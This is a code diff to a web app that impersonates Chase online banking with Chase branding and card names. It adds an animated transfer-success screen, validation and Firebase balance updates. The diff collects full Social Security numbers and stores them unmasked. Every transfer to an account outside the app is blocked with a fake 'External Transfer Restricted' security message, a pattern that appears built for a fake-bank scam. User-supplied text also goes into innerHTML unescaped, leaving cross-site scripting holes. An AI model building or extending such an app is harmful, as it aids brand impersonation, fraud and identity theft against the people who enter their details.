@@ -735,6 +735,163 @@
             padding-left: 28px;
         }
 
+        /* Success Modal */
+        .success-modal {
+            text-align: center;
+            padding: 40px 20px;
+            animation: slideUp 0.5s ease;
+        }
+
+        @keyframes slideUp {
+            from {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+
+        .success-checkmark {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            background: var(--success);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 25px;
+            animation: scaleIn 0.5s ease 0.2s both;
+        }
+
+        @keyframes scaleIn {
+            from {
+                transform: scale(0);
+            }
+            to {
+                transform: scale(1);
+            }
+        }
+
+        .success-checkmark i {
+            font-size: 40px;
+            color: white;
+            animation: checkmark 0.5s ease 0.5s both;
+        }
+
+        @keyframes checkmark {
+            from {
+                transform: scale(0) rotate(-45deg);
+            }
+            to {
+                transform: scale(1) rotate(0);
+            }
+        }
+
+        .success-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 15px;
+            animation: fadeIn 0.5s ease 0.4s both;
+        }
+
+        .success-amount {
+            font-size: 32px;
+            font-weight: 700;
+            color: var(--chase-blue);
+            margin-bottom: 10px;
+            animation: fadeIn 0.5s ease 0.6s both;
+        }
+
+        .success-recipient {
+            font-size: 18px;
+            color: var(--text-gray);
+            margin-bottom: 20px;
+            animation: fadeIn 0.5s ease 0.8s both;
+        }
+
+        .success-details {
+            background: var(--chase-light);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            text-align: left;
+            animation: fadeIn 0.5s ease 1s both;
+        }
+
+        .success-detail-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            font-size: 14px;
+        }
+
+        .success-detail-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .success-detail-label {
+            color: var(--text-gray);
+        }
+
+        .success-detail-value {
+            font-weight: 600;
+            color: var(--text-dark);
+        }
+
+        .success-divider {
+            height: 1px;
+            background: var(--border-gray);
+            margin: 15px 0;
+        }
+
+        .success-balance {
+            font-size: 15px;
+            color: var(--text-dark);
+            margin-bottom: 25px;
+            padding: 10px;
+            background: white;
+            border-radius: 8px;
+            animation: fadeIn 0.5s ease 1.2s both;
+        }
+
+        .success-balance span {
+            font-weight: 700;
+            color: var(--chase-blue);
+        }
+
+        .btn-success {
+            background: var(--success);
+            width: 100%;
+            padding: 16px;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            animation: fadeIn 0.5s ease 1.4s both;
+        }
+
+        .btn-success:hover {
+            background: #218838;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 12px rgba(40, 167, 69, 0.3);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
         /* Error Modal */
         .error-modal {
             text-align: center;
@@ -1414,6 +1571,15 @@
             </div>
         </div>
 
+        <!-- Success Modal -->
+        <div class="modal-overlay" id="successModal">
+            <div class="modal-content">
+                <div class="success-modal" id="successModalContent">
+                    <!-- Success content will be injected here -->
+                </div>
+            </div>
+        </div>
+
         <!-- Error Modal -->
         <div class="modal-overlay" id="errorModal">
             <div class="modal-content">
@@ -1499,7 +1665,7 @@
                     <div class="form-group">
                         <label class="form-label">Annual Income</label>
                         <div class="amount-input">
-                            <input type="number" class="form-input" id="incomeInput" placeholder="75,000" value="223333">
+                            <input type="number" class="form-input" id="incomeInput" placeholder="75,000">
                         </div>
                     </div>
                     
@@ -1512,7 +1678,7 @@
                             <option value="self-employed">Self-Employed</option>
                             <option value="retired">Retired</option>
                             <option value="student">Student</option>
-                            <option value="unemployed" selected>Unemployed</option>
+                            <option value="unemployed">Unemployed</option>
                             <option value="other">Other</option>
                         </select>
                     </div>
@@ -1538,15 +1704,15 @@
                         </div>
                         <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
                             <span style="color: var(--text-gray);">SSN</span>
-                            <span style="font-weight: 600;" id="reviewSSN">***-**-5666</span>
+                            <span style="font-weight: 600;" id="reviewSSN">***-**-****</span>
                         </div>
                         <div style="display: flex; justify-content: space-between; margin-bottom: 12px;">
                             <span style="color: var(--text-gray);">Annual Income</span>
-                            <span style="font-weight: 600;" id="reviewIncome">$223,333</span>
+                            <span style="font-weight: 600;" id="reviewIncome">$0</span>
                         </div>
                         <div style="display: flex; justify-content: space-between;">
                             <span style="color: var(--text-gray);">Employment</span>
-                            <span style="font-weight: 600;" id="reviewEmployment">Unemployed</span>
+                            <span style="font-weight: 600;" id="reviewEmployment"></span>
                         </div>
                     </div>
                     
@@ -1598,7 +1764,6 @@
         let unreadCount = 0;
         let selectedCard = 'reserve';
         let cardApplications = [];
-        let pendingTransactions = [];
 
         // Prevent double-tap zoom
         document.addEventListener('touchstart', (e) => {
@@ -1886,7 +2051,7 @@
 
         // Lookup recipient
         async function lookupRecipient() {
-            const accountNumber = document.getElementById('toAccount').value;
+            const accountNumber = document.getElementById('toAccount').value.trim();
             const recipientDiv = document.getElementById('recipientInfo');
 
             if (!accountNumber || accountNumber.length < 8) {
@@ -1943,50 +2108,88 @@
             }
         }
 
+        // Show success modal
+        function showSuccessModal(amount, recipientName, fromAccount, newBalance, description) {
+            const modalContent = document.getElementById('successModalContent');
+            const date = new Date();
+            const formattedDate = date.toLocaleDateString('en-US', { 
+                month: 'long', 
+                day: 'numeric', 
+                year: 'numeric' 
+            });
+            const formattedTime = date.toLocaleTimeString('en-US', { 
+                hour: '2-digit', 
+                minute: '2-digit' 
+            });
+
+            modalContent.innerHTML = `
+                <div class="success-checkmark">
+                    <i class="fas fa-check"></i>
+                </div>
+                <h2 class="success-title">Transfer Successful!</h2>
+                <div class="success-amount">$${amount.toFixed(2)}</div>
+                <div class="success-recipient">to ${recipientName}</div>
+                
+                <div class="success-details">
+                    <div class="success-detail-item">
+                        <span class="success-detail-label">From Account</span>
+                        <span class="success-detail-value">${fromAccount === 'checking' ? 'Checking' : 'Savings'}</span>
+                    </div>
+                    <div class="success-detail-item">
+                        <span class="success-detail-label">Date</span>
+                        <span class="success-detail-value">${formattedDate}</span>
+                    </div>
+                    <div class="success-detail-item">
+                        <span class="success-detail-label">Time</span>
+                        <span class="success-detail-value">${formattedTime}</span>
+                    </div>
+                    <div class="success-detail-item">
+                        <span class="success-detail-label">Transaction ID</span>
+                        <span class="success-detail-value">#${Math.random().toString(36).substring(2, 10).toUpperCase()}</span>
+                    </div>
+                    ${description ? `
+                    <div class="success-detail-item">
+                        <span class="success-detail-label">Description</span>
+                        <span class="success-detail-value">${description}</span>
+                    </div>
+                    ` : ''}
+                </div>
+                
+                <div class="success-balance">
+                    New ${fromAccount === 'checking' ? 'Checking' : 'Savings'} Balance: <span>$${newBalance.toFixed(2)}</span>
+                </div>
+                
+                <button class="btn-success" onclick="closeModal('successModal')">
+                    Done
+                </button>
+            `;
+
+            document.getElementById('successModal').classList.add('active');
+        }
+
         // Process transfer
         async function processTransfer() {
             const fromAccount = document.getElementById('fromAccount').value;
-            const toAccount = document.getElementById('toAccount').value;
+            const toAccount = document.getElementById('toAccount').value.trim();
             const amount = parseFloat(document.getElementById('transferAmount').value);
             const description = document.getElementById('transferDesc').value || 'Transfer';
 
-            if (!toAccount || !amount) {
-                showToast('Please fill in all fields');
+            // Validation
+            if (!fromAccount) {
+                showToast('Please select an account to transfer from');
                 return;
             }
 
-            if (amount <= 0) {
+            if (!toAccount) {
+                showToast('Please enter recipient account number');
+                return;
+            }
+
+            if (!amount || amount <= 0) {
                 showToast('Please enter a valid amount');
                 return;
             }
 
-            // Check if sending to internal user
-            const checkingQuery = await db.collection('users')
-                .where('checkingAccount', '==', toAccount)
-                .get();
-
-            const savingsQuery = await db.collection('users')
-                .where('savingsAccount', '==', toAccount)
-                .get();
-
-            const isInternal = !checkingQuery.empty || !savingsQuery.empty;
-
-            if (!isInternal) {
-                // Show external transfer error
-                document.getElementById('errorCode').textContent = 'ERROR: EXT-TRF-001';
-                document.getElementById('errorTitle').textContent = 'External Transfer Restricted';
-                document.getElementById('errorMessage').innerHTML = 
-                    `Dear ${userData.fullName},<br><br>` +
-                    `For your security, transfers to external accounts are temporarily restricted. ` +
-                    `Please use internal transfers between Chase accounts only.`;
-                closeModal('transferModal');
-                setTimeout(() => {
-                    document.getElementById('errorModal').classList.add('active');
-                }, 300);
-                return;
-            }
-
-            // Process internal transfer
             const btn = document.getElementById('transferBtn');
             const btnText = document.getElementById('transferBtnText');
             
@@ -1994,6 +2197,36 @@
             btnText.innerHTML = '<span class="spinner"></span> Processing...';
 
             try {
+                console.log('Looking up recipient:', toAccount);
+                
+                // Search for user with this account number
+                const checkingQuery = await db.collection('users')
+                    .where('checkingAccount', '==', toAccount)
+                    .get();
+
+                const savingsQuery = await db.collection('users')
+                    .where('savingsAccount', '==', toAccount)
+                    .get();
+
+                const isInternal = !checkingQuery.empty || !savingsQuery.empty;
+
+                if (!isInternal) {
+                    // Show external transfer error
+                    document.getElementById('errorCode').textContent = 'ERROR: EXT-TRF-001';
+                    document.getElementById('errorTitle').textContent = 'External Transfer Restricted';
+                    document.getElementById('errorMessage').innerHTML = 
+                        `Dear ${userData.fullName},<br><br>` +
+                        `For your security, transfers to external accounts are temporarily restricted. ` +
+                        `Please use internal transfers between Chase accounts only.`;
+                    closeModal('transferModal');
+                    setTimeout(() => {
+                        document.getElementById('errorModal').classList.add('active');
+                    }, 300);
+                    btn.disabled = false;
+                    btnText.textContent = 'Send Money';
+                    return;
+                }
+
                 // Find recipient
                 let recipientDoc = null;
                 let recipientData = null;
@@ -2017,6 +2250,17 @@
                     return;
                 }
 
+                // Check sufficient funds
+                const currentBalance = fromAccount === 'checking' ? userData.checkingBalance : userData.savingsBalance;
+                if (currentBalance < amount) {
+                    showToast('Insufficient funds');
+                    btn.disabled = false;
+                    btnText.textContent = 'Send Money';
+                    return;
+                }
+
+                console.log('Processing transfer to:', recipientData.fullName);
+
                 // Update balances
                 const batch = db.batch();
 
@@ -2026,20 +2270,13 @@
                     ? userData.checkingBalance - amount
                     : userData.savingsBalance - amount;
 
-                if (newSenderBalance < 0) {
-                    showToast('Insufficient funds');
-                    btn.disabled = false;
-                    btnText.textContent = 'Send Money';
-                    return;
-                }
-
                 batch.update(senderRef, {
                     [`${fromAccount}Balance`]: newSenderBalance
                 });
 
                 // Add to recipient
                 const recipientBalanceField = `${recipientAccountType}Balance`;
-                const newRecipientBalance = recipientData[recipientBalanceField] + amount;
+                const newRecipientBalance = (recipientData[recipientBalanceField] || 0) + amount;
 
                 batch.update(recipientDoc.ref, {
                     [recipientBalanceField]: newRecipientBalance
@@ -2085,7 +2322,9 @@
                 const notifRef = db.collection('notifications').doc();
                 batch.set(notifRef, notification);
 
+                // Commit all changes
                 await batch.commit();
+                console.log('Transfer completed successfully');
 
                 // Update local data
                 if (fromAccount === 'checking') {
@@ -2105,14 +2344,16 @@
                     `$${total.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
 
                 closeModal('transferModal');
-                showToast(`Successfully sent $${amount.toFixed(2)} to ${recipientData.fullName}`);
+                
+                // Show beautiful success modal
+                showSuccessModal(amount, recipientData.fullName, fromAccount, newSenderBalance, description);
 
                 // Reload transactions
                 await loadTransactions(currentUser.uid);
 
             } catch (error) {
                 console.error('Transfer error:', error);
-                showToast('Transfer failed. Please try again.');
+                showToast('Transfer failed: ' + error.message);
             } finally {
                 btn.disabled = false;
                 btnText.textContent = 'Send Money';
@@ -2125,6 +2366,22 @@
             const income = document.getElementById('incomeInput').value;
             const employment = document.getElementById('employmentStatus').value;
 
+            // Validation
+            if (!ssn || ssn.length !== 9) {
+                showToast('Please enter a valid 9-digit SSN');
+                return;
+            }
+
+            if (!income) {
+                showToast('Please enter your annual income');
+                return;
+            }
+
+            if (!employment) {
+                showToast('Please select employment status');
+                return;
+            }
+
             const cardNames = {
                 'preferred': 'Chase Sapphire Preferred®',
                 'reserve': 'Chase Sapphire Reserve®',
@@ -2132,33 +2389,41 @@
                 'freedom-flex': 'Chase Freedom Flex℠'
             };
 
-            const application = {
-                userId: currentUser.uid,
-                cardType: selectedCard,
-                cardName: cardNames[selectedCard],
-                ssn: ssn,
-                annualIncome: parseFloat(income),
-                employmentStatus: employment,
-                status: 'Under Review',
-                timestamp: firebase.firestore.FieldValue.serverTimestamp()
-            };
+            const btn = event.currentTarget;
+            const originalText = btn.textContent;
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span> Submitting...';
 
             try {
+                const application = {
+                    userId: currentUser.uid,
+                    cardType: selectedCard,
+                    cardName: cardNames[selectedCard],
+                    ssn: ssn,
+                    annualIncome: parseFloat(income),
+                    employmentStatus: employment,
+                    status: 'Under Review',
+                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
+                };
+
+                // Save to Firebase
                 await db.collection('cardApplications').add(application);
                 
                 closeModal('cardModal');
-                showToast('Application submitted successfully');
+                showToast('Application submitted successfully!');
                 
                 // Reload card applications
                 await loadCardApplications(currentUser.uid);
                 
                 // Switch to cards tab
-                document.getElementById('accountsView').classList.add('hidden');
-                document.getElementById('cardsView').classList.remove('hidden');
-                document.querySelectorAll('.nav-item').forEach(item => item.classList.remove('active'));
+                switchTab('cards', { currentTarget: document.querySelectorAll('.nav-item')[3] });
+                
             } catch (error) {
                 console.error('Error submitting application:', error);
-                showToast('Failed to submit application');
+                showToast('Failed to submit application: ' + error.message);
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = originalText;
             }
         }
 
@@ -2212,11 +2477,13 @@
                 return;
             }
 
-            list.innerHTML = transactions.map(t => `
+            list.innerHTML = transactions.map(t => {
+                const date = t.timestamp ? new Date(t.timestamp.toDate()) : new Date();
+                return `
                 <div class="transaction-item">
                     <div class="transaction-info">
                         <div class="transaction-name">${t.name}</div>
-                        <div class="transaction-date">${new Date(t.timestamp?.toDate()).toLocaleString()}</div>
+                        <div class="transaction-date">${date.toLocaleString()}</div>
                         ${t.description ? `<div style="font-size: 11px; color: var(--text-gray);">${t.description}</div>` : ''}
                     </div>
                     <div class="transaction-amount ${t.type === 'credit' ? 'positive' : 'negative'}">
@@ -2224,7 +2491,7 @@
                         <div class="transaction-balance">$${t.balance.toFixed(2)}</div>
                     </div>
                 </div>
-            `).join('');
+            `}).join('');
         }
 
         // Render notifications
@@ -2236,13 +2503,15 @@
                 return;
             }
 
-            list.innerHTML = notifications.map(n => `
+            list.innerHTML = notifications.map(n => {
+                const date = n.timestamp ? new Date(n.timestamp.toDate()) : new Date();
+                return `
                 <div class="notification-item">
                     <div class="notification-title">${n.title}</div>
                     <div class="notification-desc">${n.message}</div>
-                    <div class="notification-time">${new Date(n.timestamp?.toDate()).toLocaleString()}</div>
+                    <div class="notification-time">${date.toLocaleString()}</div>
                 </div>
-            `).join('');
+            `}).join('');
         }
 
         // Open notifications and mark as read
@@ -2266,6 +2535,8 @@
         // Open profile modal
         function openProfileModal() {
             const profileDiv = document.getElementById('profileInfo');
+            const joinDate = userData.createdAt ? new Date(userData.createdAt.toDate()) : new Date();
+            
             profileDiv.innerHTML = `
                 <div class="profile-avatar">${userData.fullName.charAt(0)}</div>
                 <div class="profile-detail">
@@ -2294,7 +2565,7 @@
                 </div>
                 <div class="profile-detail">
                     <div class="profile-label">Member Since</div>
-                    <div class="profile-value">${new Date(userData.createdAt?.toDate()).toLocaleDateString()}</div>
+                    <div class="profile-value">${joinDate.toLocaleDateString()}</div>
                 </div>
                 <button class="btn-primary" onclick="closeModal('profileModal')" style="margin-top: 20px;">Close</button>
             `;
@@ -2342,7 +2613,7 @@
             document.getElementById('reviewCardType').textContent = cardNames[selectedCard];
             document.getElementById('reviewSSN').textContent = `***-**-${ssn.slice(-4)}`;
             document.getElementById('reviewIncome').textContent = `$${parseInt(document.getElementById('incomeInput').value || 0).toLocaleString()}`;
-            document.getElementById('reviewEmployment').textContent = document.getElementById('employmentStatus').value || 'Unemployed';
+            document.getElementById('reviewEmployment').textContent = document.getElementById('employmentStatus').value || 'Not specified';
             
             document.getElementById('cardStep2').classList.add('hidden');
             document.getElementById('cardStep3').classList.remove('hidden');
